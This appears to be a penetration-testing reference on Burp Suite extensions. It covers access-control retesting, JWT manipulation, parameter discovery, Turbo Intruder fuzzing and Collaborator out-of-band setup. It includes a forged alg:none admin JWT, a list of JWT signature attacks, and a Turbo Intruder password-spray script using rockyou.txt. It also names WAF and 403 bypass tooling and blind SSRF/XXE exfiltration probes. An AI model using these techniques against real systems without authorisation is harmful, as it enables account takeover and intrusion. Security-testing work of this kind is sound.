# Burp Suite — BApp Extensions for Offensive Testing

## Essential Extensions

### Autorize — Broken Access Control Detection

Automatically retest every request with lower-privilege session to detect IDOR and auth bypass.

```
Setup:
1. Install Autorize from BApp Store
2. Log in as high-privilege user, copy session cookie
3. Autorize tab → paste low-privilege cookie in "Authorization Header"
4. Enable Autorize (toggle on)
5. Browse application as high-privilege user
6. Autorize replays each request with low-priv cookie
7. Red = bypassed (low-priv got same response as high-priv) → IDOR/BAC finding
8. Filter: show "Bypassed!" only
```

### JWT Editor — JWT Manipulation

```
Attacks available:
- Algorithm confusion (RS256 → HS256): use public key as HMAC secret
- None algorithm: remove signature entirely
- Embedded JWK: inject attacker-controlled key in header
- JWKS spoofing: point jku/x5u to attacker-controlled URL

Workflow:
1. Intercept request with JWT → Repeater
2. JWT Editor tab in request → modify claims (e.g., "role": "admin")
3. Sign with embedded key or attack signature
4. Resend and observe response

# alg:none attack (manual):
# Decode JWT, change {"alg":"RS256"} → {"alg":"none"}
# Remove signature (keep trailing dot)
# eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.
```

### Param Miner — Hidden Parameter Discovery

```
# Right-click request → Extensions → Param Miner → Guess params
# Options:
# - Guess headers: finds non-standard headers (X-Forwarded-For, X-Original-URL, etc.)
# - Guess params: finds hidden GET/POST params that affect response
# - Guess cookie params: additional cookie parameters

# Useful for:
# - Finding X-Forwarded-Host → Host header injection
# - Finding hidden debug params (debug=true, admin=1)
# - Cache poisoning vectors
```

### Active Scan++ — Extended Checks

```
Adds checks not in default scanner:
- SSRF via Collaborator probes in all params
- XXE in XML bodies
- Template injection (SSTI)
- Code injection patterns
- HTTP header injection
- Prototype pollution

Install: BApp Store → Active Scan++
# Automatically runs on scanned requests
```

### Turbo Intruder — High-Speed Fuzzing

```python
# Race condition test (simultaneous requests):
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=True)
    for i in range(30):
        engine.queue(target.req, str(i))

def handleResponse(req, interesting):
    if '200' in req.status:
        table.add(req)

# Password spray (fast):
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=1)
    for word in open('/usr/share/wordlists/rockyou.txt'):
        engine.queue(target.req, word.rstrip())

def handleResponse(req, interesting):
    if 'Invalid' not in req.response:
        table.add(req)
```

### Other Useful Extensions

| Extension | Use Case |
|-----------|---------|
| **403 Bypasser** | Auto-test 14+ bypass techniques on 403 responses |
| **Logger++** | Advanced log filtering, export, Grepable patterns |
| **JS Miner** | Extract endpoints, params, secrets from JS files |
| **Upload Scanner** | Test file upload for RCE (PHP, JSP, ASPX bypass) |
| **Hackvertor** | Multi-step encode/decode chains in requests |
| **HTTP Request Smuggler** | Detect CL.TE and TE.CL desync issues |
| **Retire.js** | Detect outdated/vulnerable JS libraries in-browser |
| **InQL** | GraphQL introspection and testing |
| **HUNT** | Flag interesting parameters (SQLi, SSRF, LFI, etc.) |
| **Bypass WAF** | Encode payloads to bypass WAF rules |

## BApp Installation

```
Extender → BApp Store → search → Install
# Or manual: Extender → Extensions → Add → select JAR/Python/Ruby file
# Python extensions require Jython standalone JAR configured in Extender → Options
```

## Collaborator (OAST) Setup

```
# Burp Collaborator = out-of-band interaction server
# Use for blind SSRF, blind XXE, blind XSS, DNS exfiltration

# Pro: use built-in Collaborator
Project → Options → Misc → Burp Collaborator Server
# Or set up private: burp collaborator --collaborator-config=config.json

# In Repeater: right-click → Insert Collaborator Payload
# Generates: xxxxx.burpcollaborator.net
# Use in: SSRF target, XXE DTD, img src, email field, etc.

# Check interactions:
Burp menu → Burp Collaborator Client → Poll now
```
